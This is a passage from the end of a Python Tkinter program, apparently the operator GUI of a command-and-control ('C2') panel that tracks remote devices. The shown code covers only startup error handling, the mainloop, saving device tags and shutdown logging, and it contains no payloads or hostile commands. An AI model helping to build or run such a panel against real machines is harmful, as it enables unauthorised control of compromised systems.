            gui_app.add_system_log(f"GUI startup error: {e}", error=True)
        else: # If master itself failed
            print(f"Critical GUI startup error (master window may not exist): {e}")
            # Potentially try to show a basic Tk messagebox if root is somewhat functional
            try: messagebox.showerror("GUI Startup Error", f"Failed to initialize GUI: {e}\nPanel may not function correctly.")
            except: pass # If even messagebox fails, we've logged it.
            
    try:
        root.mainloop()
    except KeyboardInterrupt:
        logger.info("C2 Panel shutting down via KeyboardInterrupt.")
    except Exception as e_mainloop:
        logger.error(f"Error in Tkinter mainloop: {e_mainloop}", exc_info=True)
    finally:
        save_device_tags()
        logger.info("C2 Panel GUI closed. Server thread is a daemon and will exit if main exits.")

if __name__ == "__main__":
    main()